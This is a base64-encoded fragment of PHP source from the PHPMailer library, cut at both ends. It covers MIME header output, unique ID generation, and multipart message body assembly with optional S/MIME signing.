9pbmxpbmUnOgogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVsxXSAuICciJyk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIC8vIENhdGNoZXMgY2FzZSAncGxhaW4nOiBhbmQgY2FzZSAnJzoKICAgICAgICAgICAgICAgICRyZXN1bHQgLj0gJHRoaXMtPnRleHRMaW5lKCdDb250ZW50LVR5cGU6ICcgLiAkdGhpcy0+Q29udGVudFR5cGUgLiAnOyBjaGFyc2V0PScgLiAkdGhpcy0+Q2hhclNldCk7CiAgICAgICAgICAgICAgICAkaXNtdWx0aXBhcnQgPSBmYWxzZTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KICAgICAgICAvLyBSRkMxMzQxIHBhcnQgNSBzYXlzIDdiaXQgaXMgYXNzdW1lZCBpZiBub3Qgc3BlY2lmaWVkCiAgICAgICAgaWYgKCR0aGlzLT5FbmNvZGluZyAhPSAnN2JpdCcpIHsKICAgICAgICAgICAgLy8gUkZDIDIwNDUgc2VjdGlvbiA2LjQgc2F5cyBtdWx0aXBhcnQgTUlNRSBwYXJ0cyBtYXkgb25seSB1c2UgN2JpdCwgOGJpdCBvciBiaW5hcnkgQ1RFCiAgICAgICAgICAgIGlmICgkaXNtdWx0aXBhcnQpIHsKICAgICAgICAgICAgICAgIGlmICgkdGhpcy0+RW5jb2RpbmcgPT0gJzhiaXQnKSB7CiAgICAgICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICc4Yml0Jyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAvLyBUaGUgb25seSByZW1haW5pbmcgYWx0ZXJuYXRpdmVzIGFyZSBxdW90ZWQtcHJpbnRhYmxlIGFuZCBiYXNlNjQsIHdoaWNoIGFyZSBib3RoIDdiaXQgY29tcGF0aWJsZQogICAgICAgICAgICB9IGVsc2UgewogICAgICAgICAgICAgICAgJHJlc3VsdCAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UcmFuc2Zlci1FbmNvZGluZycsICR0aGlzLT5FbmNvZGluZyk7CiAgICAgICAgICAgIH0KICAgICAgICB9CgogICAgICAgIGlmICgkdGhpcy0+TWFpbGVyICE9ICdtYWlsJykgewogICAgICAgICAgICAkcmVzdWx0IC49ICR0aGlzLT5MRTsKICAgICAgICB9CgogICAgICAgIHJldHVybiAkcmVzdWx0OwogICAgfQoKICAgIC8qKgogICAgICogUmV0dXJucyB0aGUgd2hvbGUgTUlNRSBtZXNzYWdlLgogICAgICogSW5jbHVkZXMgY29tcGxldGUgaGVhZGVycyBhbmQgYm9keS4KICAgICAqIE9ubHkgdmFsaWQgcG9zdCBwcmVTZW5kKCkuCiAgICAgKiBAc2VlIFBIUE1haWxlcjo6cHJlU2VuZCgpCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHJldHVybiBzdHJpbmcKICAgICAqLwogICAgcHVibGljIGZ1bmN0aW9uIGdldFNlbnRNSU1FTWVzc2FnZSgpCiAgICB7CiAgICAgICAgcmV0dXJuIHJ0cmltKCR0aGlzLT5NSU1FSGVhZGVyIC4gJHRoaXMtPm1haWxIZWFkZXIsICJcblxyIikgLiBzZWxmOjpDUkxGIC4gc2VsZjo6Q1JMRiAuICR0aGlzLT5NSU1FQm9keTsKICAgIH0KCiAgICAvKioKICAgICAqIENyZWF0ZSB1bmlxdWUgSUQKICAgICAqIEByZXR1cm4gc3RyaW5nCiAgICAgKi8KICAgIHByb3RlY3RlZCBmdW5jdGlvbiBnZW5lcmF0ZUlkKCkgewogICAgICAgIHJldHVybiBtZDUodW5pcWlkKHRpbWUoKSkpOwogICAgfQoKICAgIC8qKgogICAgICogQXNzZW1ibGUgdGhlIG1lc3NhZ2UgYm9keS4KICAgICAqIFJldHVybnMgYW4gZW1wdHkgc3RyaW5nIG9uIGZhaWx1cmUuCiAgICAgKiBAYWNjZXNzIHB1YmxpYwogICAgICogQHRocm93cyBwaHBtYWlsZXJFeGNlcHRpb24KICAgICAqIEByZXR1cm4gc3RyaW5nIFRoZSBhc3NlbWJsZWQgbWVzc2FnZSBib2R5CiAgICAgKi8KICAgIHB1YmxpYyBmdW5jdGlvbiBjcmVhdGVCb2R5KCkKICAgIHsKICAgICAgICAkYm9keSA9ICcnOwogICAgICAgIC8vQ3JlYXRlIHVuaXF1ZSBJRHMgYW5kIHByZXNldCBib3VuZGFyaWVzCiAgICAgICAgJHRoaXMtPnVuaXF1ZWlkID0gJHRoaXMtPmdlbmVyYXRlSWQoKTsKICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMV0gPSAnYjFfJyAuICR0aGlzLT51bmlxdWVpZDsKICAgICAgICAkdGhpcy0+Ym91bmRhcnlbMl0gPSAnYjJfJyAuICR0aGlzLT51bmlxdWVpZDsKICAgICAgICAkdGhpcy0+Ym91bmRhcnlbM10gPSAnYjNfJyAuICR0aGlzLT51bmlxdWVpZDsKCiAgICAgICAgaWYgKCR0aGlzLT5zaWduX2tleV9maWxlKSB7CiAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRNYWlsTUlNRSgpIC4gJHRoaXMtPkxFOwogICAgICAgIH0KCiAgICAgICAgJHRoaXMtPnNldFdvcmRXcmFwKCk7CgogICAgICAgICRib2R5RW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7CiAgICAgICAgJGJvZHlDaGFyU2V0ID0gJHRoaXMtPkNoYXJTZXQ7CiAgICAgICAgLy9DYW4gd2UgZG8gYSA3LWJpdCBkb3duZ3JhZGU/CiAgICAgICAgaWYgKCRib2R5RW5jb2RpbmcgPT0gJzhiaXQnIGFuZCAhJHRoaXMtPmhhczhiaXRDaGFycygkdGhpcy0+Qm9keSkpIHsKICAgICAgICAgICAgJGJvZHlFbmNvZGluZyA9ICc3Yml0JzsKICAgICAgICAgICAgLy9BbGwgSVNPIDg4NTksIFdpbmRvd3MgY29kZXBhZ2UgYW5kIFVURi04IGNoYXJzZXRzIGFyZSBhc2NpaSBjb21wYXRpYmxlIHVwIHRvIDctYml0CiAgICAgICAgICAgICRib2R5Q2hhclNldCA9ICd1cy1hc2NpaSc7CiAgICAgICAgfQogICAgICAgIC8vSWYgbGluZXMgYXJlIHRvbyBsb25nLCBhbmQgd2UncmUgbm90IGFscmVhZHkgdXNpbmcgYW4gZW5jb2RpbmcgdGhhdCB3aWxsIHNob3J0ZW4gdGhlbSwKICAgICAgICAvL2NoYW5nZSB0byBxdW90ZWQtcHJpbnRhYmxlIHRyYW5zZmVyIGVuY29kaW5nIGZvciB0aGUgYm9keSBwYXJ0IG9ubHkKICAgICAgICBpZiAoJ2Jhc2U2NCcgIT0gJHRoaXMtPkVuY29kaW5nIGFuZCBzZWxmOjpoYXNMaW5lTG9uZ2VyVGhhbk1heCgkdGhpcy0+Qm9keSkpIHsKICAgICAgICAgICAgJGJvZHlFbmNvZGluZyA9ICdxdW90ZWQtcHJpbnRhYmxlJzsKICAgICAgICB9CgogICAgICAgICRhbHRCb2R5RW5jb2RpbmcgPSAkdGhpcy0+RW5jb2Rpbmc7CiAgICAgICAgJGFsdEJvZHlDaGFyU2V0ID0gJHRoaXMtPkNoYXJTZXQ7CiAgICAgICAgLy9DYW4gd2UgZG8gYSA3LWJpdCBkb3duZ3JhZGU/CiAgICAgICAgaWYgKCRhbHRCb2R5RW5jb2RpbmcgPT0gJzhiaXQnIGFuZCAhJHRoaXMtPmhhczhiaXRDaGFycygkdGhpcy0+QWx0Qm9keSkpIHsKICAgICAgICAgICAgJGFsdEJvZHlFbmNvZGluZyA9ICc3Yml0JzsKICAgICAgICAgICAgLy9BbGwgSVNPIDg4NTksIFdpbmRvd3MgY29kZXBhZ2UgYW5kIFVURi04IGNoYXJzZXRzIGFyZSBhc2NpaSBjb21wYXRpYmxlIHVwIHRvIDctYml0CiAgICAgICAgICAgICRhbHRCb2R5Q2hhclNldCA9ICd1cy1hc2NpaSc7CiAgICAgICAgfQogICAgICAgIC8vSWYgbGluZXMgYXJlIHRvbyBsb25nLCBhbmQgd2UncmUgbm90IGFscmVhZHkgdXNpbmcgYW4gZW5jb2RpbmcgdGhhdCB3aWxsIHNob3J0ZW4gdGhlbSwKICAgICAgICAvL2NoYW5nZSB0byBxdW90ZWQtcHJpbnRhYmxlIHRyYW5zZmVyIGVuY29kaW5nIGZvciB0aGUgYWx0IGJvZHkgcGFydCBvbmx5CiAgICAgICAgaWYgKCdiYXNlNjQnICE9ICRhbHRCb2R5RW5jb2RpbmcgYW5kIHNlbGY6Omhhc0xpbmVMb25nZXJUaGFuTWF4KCR0aGlzLT5BbHRCb2R5KSkgewogICAgICAgICAgICAkYWx0Qm9keUVuY29kaW5nID0gJ3F1b3RlZC1wcmludGFibGUnOwogICAgICAgIH0KICAgICAgICAvL1VzZSB0aGlzIGFzIGEgcHJlYW1ibGUgaW4gYWxsIG11bHRpcGFydCBtZXNzYWdlIHR5cGVzCiAgICAgICAgJG1pbWVwcmUgPSAiVGhpcyBpcyBhIG11bHRpLXBhcnQgbWVzc2FnZSBpbiBNSU1FIGZvcm1hdC4iIC4gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgIHN3aXRjaCAoJHRoaXMtPm1lc3NhZ2VfdHlwZSkgewogICAgICAgICAgICBjYXNlICdpbmxpbmUnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICcnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhdHRhY2gnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICcnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnaW5saW5lX2F0dGFjaCc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgnLS0nIC4gJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5oZWFkZXJMaW5lKCdDb250ZW50LVR5cGUnLCAnbXVsdGlwYXJ0L3JlbGF0ZWQ7Jyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRib2R5Q2hhclNldCwgJycsICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+YXR0YWNoQWxsKCdpbmxpbmUnLCAkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYWx0JzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgaWYgKCFlbXB0eSgkdGhpcy0+SWNhbCkpIHsKICAgICAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdLCAnJywgJ3RleHQvY2FsZW5kYXI7IG1ldGhvZD1SRVFVRVNUJywgJycpOwogICAgICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkljYWwsICR0aGlzLT5FbmNvZGluZyk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuZEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZSc6CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkbWltZXByZTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMV0sICRhbHRCb2R5Q2hhclNldCwgJ3RleHQvcGxhaW4nLCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvcmVsYXRlZDsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGJvZHlDaGFyU2V0LCAndGV4dC9odG1sJywgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5hdHRhY2hBbGwoJ2lubGluZScsICR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5kQm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzFdKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgICAgICBjYXNlICdhbHRfYXR0YWNoJzoKICAgICAgICAgICAgICAgICRib2R5IC49ICRtaW1lcHJlOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCctLScgLiAkdGhpcy0+Ym91bmRhcnlbMV0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmhlYWRlckxpbmUoJ0NvbnRlbnQtVHlwZScsICdtdWx0aXBhcnQvYWx0ZXJuYXRpdmU7Jyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoIlx0Ym91bmRhcnk9XCIiIC4gJHRoaXMtPmJvdW5kYXJ5WzJdIC4gJyInKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5nZXRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0sICRhbHRCb2R5Q2hhclNldCwgJ3RleHQvcGxhaW4nLCAkYWx0Qm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkFsdEJvZHksICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGJvZHlDaGFyU2V0LCAndGV4dC9odG1sJywgJGJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+ZW5jb2RlU3RyaW5nKCR0aGlzLT5Cb2R5LCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRSAuICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgY2FzZSAnYWx0X2lubGluZV9hdHRhY2gnOgogICAgICAgICAgICAgICAgJGJvZHkgLj0gJG1pbWVwcmU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9hbHRlcm5hdGl2ZTsnKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT50ZXh0TGluZSgiXHRib3VuZGFyeT1cIiIgLiAkdGhpcy0+Ym91bmRhcnlbMl0gLiAnIicpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmdldEJvdW5kYXJ5KCR0aGlzLT5ib3VuZGFyeVsyXSwgJGFsdEJvZHlDaGFyU2V0LCAndGV4dC9wbGFpbicsICRhbHRCb2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+QWx0Qm9keSwgJGFsdEJvZHlFbmNvZGluZyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEUgLiAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+dGV4dExpbmUoJy0tJyAuICR0aGlzLT5ib3VuZGFyeVsyXSk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+aGVhZGVyTGluZSgnQ29udGVudC1UeXBlJywgJ211bHRpcGFydC9yZWxhdGVkOycpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPnRleHRMaW5lKCJcdGJvdW5kYXJ5PVwiIiAuICR0aGlzLT5ib3VuZGFyeVszXSAuICciJyk7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+TEU7CiAgICAgICAgICAgICAgICAkYm9keSAuPSAkdGhpcy0+Z2V0Qm91bmRhcnkoJHRoaXMtPmJvdW5kYXJ5WzNdLCAkYm9keUNoYXJTZXQsICd0ZXh0L2h0bWwnLCAkYm9keUVuY29kaW5nKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmNvZGVTdHJpbmcoJHRoaXMtPkJvZHksICRib2R5RW5jb2RpbmcpOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnaW5saW5lJywgJHRoaXMtPmJvdW5kYXJ5WzNdKTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5MRTsKICAgICAgICAgICAgICAgICRib2R5IC49ICR0aGlzLT5lbmRCb3VuZGFyeSgkdGhpcy0+Ym91bmRhcnlbMl0pOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmF0dGFjaEFsbCgnYXR0YWNobWVudCcsICR0aGlzLT5ib3VuZGFyeVsxXSk7CiAgICAgICAgICAgICAgICBicmVhazsKICAgICAgICAgICAgZGVmYXVsdDoKICAgICAgICAgICAgICAgIC8vIENhdGNoIGNhc2UgJ3BsYWluJyBhbmQgY2FzZSAnJywgYXBwbGllcyB0byBzaW1wbGUgYHRleHQvcGxhaW5gIGFuZCBgdGV4dC9odG1sYCBib2R5IGNvbnRlbnQgdHlwZXMKICAgICAgICAgICAgICAgIC8vUmVzZXQgdGhlIGBFbmNvZGluZ2AgcHJvcGVydHkgaW4gY2FzZSB3ZSBjaGFuZ2VkIGl0IGZvciBsaW5lIGxlbmd0aCByZWFzb25zCiAgICAgICAgICAgICAgICAkdGhpcy0+RW5jb2RpbmcgPSAkYm9keUVuY29kaW5nOwogICAgICAgICAgICAgICAgJGJvZHkgLj0gJHRoaXMtPmVuY29kZVN0cmluZygkdGhpcy0+Qm9keSwgJHRoaXMtPkVuY29kaW5nKTsKICAgICAgICAgICAgICAgIGJyZWFrOwogICAgICAgIH0KCiAgICAgICAgaWYgKCR0aGlzLT5pc0Vycm9yKCkpIHsKICAgICAgICAgICAgJGJvZHkgPSAnJzsKICAgICAgICB9IGVsc2VpZiAoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpIHsKICAgICAgICAgICAgdHJ5IHsKICAgICAgICAgICAgICAgIGlmICghZGVmaW5lZCgnUEtDUzdfVEVYVCcpKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnZXh0ZW5zaW9uX21pc3NpbmcnKSAuICdvcGVuc3NsJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAvLyBAVE9ETyB3b3VsZCBiZSBuaWNlIHRvIHVzZSBwaHA6Ly90ZW1wIHN0cmVhbXMgaGVyZSwgYnV0IG5lZWQgdG8gd3JhcCBmb3IgUEhQIDwgNS4xCiAgICAgICAgICAgICAgICAkZmlsZSA9IHRlbXBuYW0oc3lzX2dldF90ZW1wX2RpcigpLCAnbWFpbCcpOwogICAgICAgICAgICAgICAgaWYgKGZhbHNlID09PSBmaWxlX3B1dF9jb250ZW50cygkZmlsZSwgJGJvZHkpKSB7CiAgICAgICAgICAgICAgICAgICAgdGhyb3cgbmV3IHBocG1haWxlckV4Y2VwdGlvbigkdGhpcy0+bGFuZygnc2lnbmluZycpIC4gJyBDb3VsZCBub3Qgd3JpdGUgdGVtcCBmaWxlJyk7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkc2lnbmVkID0gdGVtcG5hbShzeXNfZ2V0X3RlbXBfZGlyKCksICdzaWduZWQnKTsKICAgICAgICAgICAgICAgIC8vV29ya2Fyb3VuZCBmb3IgUEhQIGJ1ZyBodHRwczovL2J1Z3MucGhwLm5ldC9idWcucGhwP2lkPTY5MTk3CiAgICAgICAgICAgICAgICBpZiAoZW1wdHkoJHRoaXMtPnNpZ25fZXh0cmFjZXJ0c19maWxlKSkgewogICAgICAgICAgICAgICAgICAgICRzaWduID0gQG9wZW5zc2xfcGtjczdfc2lnbigKICAgICAgICAgICAgICAgICAgICAgICAgJGZpbGUsCiAgICAgICAgICAgICAgICAgICAgICAgICRzaWduZWQsCiAgICAgICAgICAgICAgICAgICAgICAgICdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2NlcnRfZmlsZSksCiAgICAgICAgICAgICAgICAgICAgICAgIGFycmF5KCdmaWxlOi8vJyAuIHJlYWxwYXRoKCR0aGlzLT5zaWduX2tleV9maWxlKSwgJHRoaXMtPnNpZ25fa2V5X3Bhc3MpLAogICAgICAgICAgICAgICAgICAgICAgICBudWxsCiAgICAgICAgICAgICAgICAgICAgKTsKICAgICAgICAgICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJHNpZ24gPSBAb3BlbnNzbF9wa2NzN19zaWduKAogICAgICAgICAgICAgICAgICAgICAgICAkZmlsZSwKICAgICAgICAgICAgICAgICAgICAgICAgJHNpZ25lZCwKICAgICAgICAgICAgICAgICAgICAgICAgJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fY2VydF9maWxlKSwKICAgICAgICAgICAgICAgICAgICAgICAgYXJyYXkoJ2ZpbGU6Ly8nIC4gcmVhbHBhdGgoJHRoaXMtPnNpZ25fa2V5X2ZpbGUpLCAkdGhpcy0+c2lnbl9rZXlfcGFzcyksCiAgICAgICAgICAgICAgICAgICAgICAgIG51bGwsCiAgICAgICAgICAgICAgICAgICAgICAgIFBLQ1M3X0RFVEFDSEVELAogICAgICAgICAgICAgICAgICAgICAgICAkdGhpcy0+c2lnbl9leHRyYWNlcnRzX2ZpbGUKICAgICAgICAgICAgICAgICAgICApOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgaWYgKCRzaWduKSB7CiAgICAgICAgICAgICAgICAgICAgQHVubGluaygkZmlsZSk7CiAgICAgICAgICAgICAgICAgICAgJGJvZHkgPSBmaWxlX2dldF9jb250ZW50cygkc2lnbmVkKTsKICAgICAgICAgICAgICAgICAgICBAdW5saW5rKCRzaWduZWQpOwogICAgICAgICAgICAgICAgICAgIC8vVGhlIG1lc3NhZ2UgcmV0dXJuZWQgYnkgb3BlbnNzbCBjb250YWlucyBib3RoIGhlYWRlcnMgYW5kIGJvZHksIHNvIG5lZWQgdG8gc3BsaXQgdGhlbSB1cAogICAgICAgICAgICAgICAgICAgICRwYXJ0cyA9IGV4cGxvZGUoIlxuXG4iLCAkYm9keSwgMik7CiAgICAgICAgICAgICAgICAgICAgJHRoaXMtPk1JTUVIZWFkZXIgLj0gJHBhcnRzWzBdIC4gJHRoaXMtPkxFIC4gJHRoaXMtPkxFOwogICAgICAgICAgICAgICAgICAgICRib2R5ID0gJHBhcnRzWzFdOwogICAgICAgICAgICAgICAgfSBlbHNlIHsKICAgICAgICAgICAgICAgICAgICBAdW5saW5